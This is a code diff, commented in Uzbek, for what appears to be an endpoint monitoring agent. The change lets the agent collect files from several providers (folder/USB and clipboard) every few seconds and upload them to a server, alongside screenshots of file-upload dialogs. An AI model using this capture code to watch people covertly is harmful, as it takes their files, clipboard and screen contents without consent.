@@ -58,7 +58,7 @@ def main() -> None:
     if registered and updater.check_and_update(client, VERSION):
         return  # qayta ishga tushmoqda
 
-    collectors, screenshot, file_provider = build_collectors(cfg.enabled_collectors)
+    collectors, screenshot, file_providers = build_collectors(cfg.enabled_collectors)
 
     # Fayl tanlash/yuklash oynasini aniqlovchi (faqat Windows)
     dialog_detector = None
@@ -109,17 +109,18 @@ def main() -> None:
                         client.send_screenshot(shot[0], "Fayl yuborish (tanlash)", dtitle)
                     last_dialog_shot = now
 
-            # 2b) Ushlangan fayllar (har ~8s, bir siklда bir nechta)
-            if registered and file_provider and now - last_file >= 8:
-                for _ in range(10):  # navbatдан 10 tagacha fayl
-                    f = file_provider.capture()
-                    if not f:
-                        break
-                    client.send_file(
-                        f["data"], f["filename"], f.get("mime", "application/octet-stream"),
-                        f.get("channel", ""), f.get("source_path", ""),
-                        f.get("source_url", ""), f.get("context_app", ""), f.get("context_title", ""),
-                    )
+            # 2b) Ushlangan fayllar (har ~8s): papka/USB + clipboard provayderlari
+            if registered and file_providers and now - last_file >= 8:
+                for fp in file_providers:
+                    for _ in range(10):  # har provayderдан 10 tagacha fayl
+                        f = fp.capture()
+                        if not f:
+                            break
+                        client.send_file(
+                            f["data"], f["filename"], f.get("mime", "application/octet-stream"),
+                            f.get("channel", ""), f.get("source_path", ""),
+                            f.get("source_url", ""), f.get("context_app", ""), f.get("context_title", ""),
+                        )
                 last_file = now
 
             # 3) Vaqti-vaqti bilan "men tirikman" (har 60s)
